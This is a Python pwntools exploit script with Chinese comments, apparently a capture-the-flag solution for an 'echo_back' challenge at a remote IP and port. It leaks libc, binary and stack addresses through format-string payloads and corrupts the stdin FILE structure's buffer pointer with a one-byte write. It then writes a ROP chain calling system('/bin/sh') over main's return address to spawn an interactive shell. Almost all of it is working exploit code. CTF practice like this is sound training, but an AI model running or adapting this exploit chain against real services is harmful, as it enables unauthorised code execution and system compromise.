#coding:utf8
from pwn import *
import time
context.log_level = 'debug'

libcpath = './libc.so.6'
#sh = process('./echo_back')
sh = remote('111.200.241.244', 62253)
elf = ELF('./pwn')
libc = ELF(libcpath)
#main 在 elf 中的静态地址
main_s_addr = 0xC6C
#pop rdi
#retn
#在 elf 中的静态地址
pop_s_rdi = 0xD93

_IO_2_1_stdin_ = libc.symbols['_IO_2_1_stdin_']


def echoback(content):
	sh.sendlineafter(b'choice>>',b'2')
	sh.sendlineafter(b'length:',b'7')
	sh.send(content)

def setName(name):
	sh.sendlineafter(b'choice>>',b'1')
	sh.sendafter(b'name:',name)

echoback(b'%19$p')

sh.recvuntil(b'0x')
#泄露__libc_start_main 的地址
__libc_start_main = int((sh.recvuntil(b'-').split(b'-')[0]).decode(), 16) - 0xF0
#得到 libc 加载的基地址
libc_base = __libc_start_main - libc.sym['__libc_start_main']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
_IO_2_1_stdin_addr = libc_base + _IO_2_1_stdin_
_IO_buf_base = _IO_2_1_stdin_addr + 0x8 * 7

print('libc_base=', hex(libc_base))
print('iobase=', hex(_IO_buf_base))

#泄露 main 的地址
echoback(b'%13$p')
sh.recvuntil(b'0x')
main_addr = int(sh.recvuntil(b'-').split(b'-')[0],16) - 0x9C
elf_base = main_addr - main_s_addr
pop_rdi = elf_base + pop_s_rdi
print('elf base=', hex(pop_rdi))

echoback(b'%12$p\n')
sh.recvuntil(b'0x')
#泄露 main 的 ebp 的值
main_ebp = int(sh.recvuntil(b'-').split(b'-')[0],16)
#泄露存放(main 返回地址)的地址
main_ret = main_ebp + 0x8

setName(p64(_IO_buf_base))
#覆盖_IO_buf_base 的低 1 字节为 0
echoback(b'%16$hhn\n')

#修改_IO_2_1_stdin_结构体
payload = p64(0x83 + _IO_2_1_stdin_addr)*3 + p64(main_ret) + p64(main_ret + 0x8 * 3)
sh.sendlineafter(b'choice>>',b'2')
sh.sendafter(b'length:',payload)
sh.sendline(b'')
#不断调用 getchar()使 fp->_IO_read_ptr 与使 fp->_IO_read_end 相等
for i in range(0,len(payload)-1):
	sh.sendlineafter(b'choice>>',b'2')
	sh.sendlineafter(b'length:',b'')
	print("COUNTER: ", i)

#对目标写入 ROP
sh.sendlineafter(b'choice>>',b'2')
payload = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
sh.sendlineafter(b'length:',payload)
#这个换行最好单独发送
sh.sendline(b'')
#getshell
sh.sendlineafter(b'choice>>',b'3')

sh.interactive()